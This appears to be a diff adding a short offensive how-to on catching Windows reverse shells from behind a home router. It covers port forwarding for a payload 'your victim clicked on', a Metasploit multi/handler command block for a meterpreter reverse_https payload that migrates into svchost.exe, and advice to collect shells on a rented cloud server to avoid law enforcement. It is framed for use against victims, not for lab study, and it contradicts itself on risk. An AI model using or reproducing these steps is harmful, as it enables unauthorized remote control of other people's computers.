@@ -1,0 +1,46 @@
+How to setup a reverse handler that can connect back to you with a typical NATed network
+
+More than likely, you got the FIRST STEP right. But the second step, getting it past your Router's Firewall may have failed.
+
+So lets assume you correctly made a reverse shell for Windows as...
+
+LHOST 12.34.56.78 (Your Public IP)
+LPORT 443
+
+Then your victim clicked on it
+
+And that you have also set your listener to
+
+LHOST 0.0.0.0
+LPORT 8080
+
+You see what is going wrong here? Your home router doesn't have the instructions to forward port 443 traffic to port 8080 on your COMPUTER
+
+The fix is really easy. Go to your router configuration, either you have proprietary software to login or a web address like 192.168.1.1 or 10.0.1.1
+
+1. Find your port forwarding settings
+2. Forward port 443 inbound traffic to your local computer's IP address (type ifconfig eth0 or wlan0)
+3. For me, my internal IP is 10.0.1.2
+4. So I tell my router to forward inbound 443 traffic ----port 8080----> 10.0.1.2
+5. Restart your router and it'll take effect immediately
+
+There is no risks or internet issues from doing this. The router is smart enough to know which traffic is meant for you. There will be no internet disruptions.
+
+DISCLAIMER: Doing this is VERY risky and can get you caught up by LE, doing serious time. I would suggest using a remote server to collect reverse shell data, like Amazon AWS.
+
+The best way I usually start with as a reverse listener for Metasploit typing this... assuming the settings I mentioned above is the same
+
+                  use multi/handler
+                  set PAYLOAD windows/meterpreter/reverse_https
+                  set LPORT 8080
+                  set LHOST 0.0.0.0
+                  set PrependMigrate True
+                  set PrependMigrateProc svchost.exe
+                  exploit -j -z
+
+FINER POINTS:
+
+#1. You need to set the payload to whatever you used. You can find out by typing "search payload/operatingsystem" in Metasploit
+#2. The Reverse STAGED Handler can handle traffic from both INLINE and STAGED payloads.
+#3. You need PrependMigrate on a Windows target because as soon as the payload attaches to a Windows process, it often kills the process immediately.
+#4. Once you set up your listener in the background (hence the "-j" and "-z"), you can press enter to go on to other matters. Metasploit lets you multitask as it's handling traffic.
